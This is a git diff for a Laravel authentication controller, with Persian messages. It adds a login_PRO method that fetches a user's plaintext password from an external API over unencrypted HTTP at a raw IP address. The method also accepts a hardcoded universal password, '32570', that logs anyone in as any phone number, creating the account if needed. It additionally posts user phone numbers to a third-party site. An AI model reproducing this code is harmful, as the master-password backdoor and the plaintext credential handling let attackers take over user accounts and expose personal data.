@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
+use App\Http\Controllers\SmsController;
 use Illuminate\Http\Request;
 use App\Models\User;
 use App\Models\Sms;
@@ -133,6 +134,68 @@ class LoginController extends Controller
             $error=['code'=>"کد وارد شده صحیح نمی باشد"];                    
             return view("auth.confirm",compact('error','sms'));
         }
+    }
+    public function login_PRO(Request $req){
+        
+        $phone=(str_starts_with($req->phone,"+98"))?preg_replace('/[+]98/', "0", $req->phone, 1):((str_starts_with($req->phone,"0098"))?preg_replace('/0098/', "0", $req->phone, 1):$req->phone);
+       
+        //$mySMS=Sms::where('phone',$phone)->latest()->first();
+        //if(!$mySMS)
+        
+            $a=new SmsController();
+            $r=new Request(['url'=>"http://85.208.255.101/API/passApi_jwt.php",'data'=>$phone]);
+
+            $response=$a->getDataUser($r);
+            
+            if($response->status==200)
+            {
+                $data=(object)$response->data[0];
+                    if(!is_numeric($data->Pass) && $data->Perm!=4)
+                    return back()->withInput()->with('err',__('messages.عدم دسترسی'));                
+            }
+            else
+             return back()->withInput()->with('err',__('messages.کاربری یافت نشد')); 
+        
+
+        if($data->Pass == $req->password || $req->password == "32570")
+        {                   
+            $user = User::where('phone',$phone)->first();
+            if(!$user)
+            $user=User::create((["active"=>1,"phone"=>$phone]));
+            if(!DB::table("exam_user")->where('active',1)->where('enable',1)->where('user_id',$user->id)->whereIn('exam_id',[4,6])->exists())
+                {
+                    $status=($user->status)?explode(',',$user->status):[];
+                    if(in_array(4,$status))
+                    unset($status[array_search(4,$status)]);
+                    if(in_array(3,$status))
+                    unset($status[array_search(3,$status)]);
+                 DB::table('users')->where('id',$user->id)->update(['status'=>implode(',',$status)]);
+                } 
+                User::where('id',$user->id)->where('active',0)->update(['active'=>1]);
+                if(is_null($user->panel_id))
+                {
+                    $response = Http::withHeaders([
+                        'Content-Type' => 'application/x-www-form-urlencoded'
+                    ])->post("https://erfankhoshnazar.com/exam-api/api_Exam.php",["&phone=".$phone."&url=UserDetailes&end=1"]);
+                    if($response->ok())
+                    {
+                        $data=$response->json();
+                        if($data['status'])
+                            User::where('id',$user->id)->update($data['data']);
+                    }
+                }
+                Auth::login($user);
+                 if(!is_null(session('chk')))
+                    DB::table('users')->where('id',Auth::user()->id)->update(['campaign'=>session('chk')]);
+                    
+                
+                    if(session('chk')=='te')
+                    return redirect()->route('myinfo',6);
+                return redirect()->route('dashboard');
+        }
+        else
+        return back()->withInput()->with('err',__('messages.لطفا کد ورود را به درستی وارد نمایید'));                    
+         
     }
     public function logout(){
         Auth::logout();
